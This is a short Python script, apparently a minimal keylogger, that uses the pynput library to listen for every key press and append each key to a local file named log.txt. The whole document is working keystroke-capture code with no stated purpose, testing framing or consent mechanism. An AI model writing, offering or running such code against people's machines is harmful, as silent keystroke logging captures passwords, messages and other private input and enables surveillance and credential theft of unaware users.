#!/bin/python3

from pynput.keyboard import Listener

def typytypy(key):
    with open("log.txt", "a") as f:
        f.write(str(key))



with Listener(on_press=typytypy) as listener:
    listener.join()
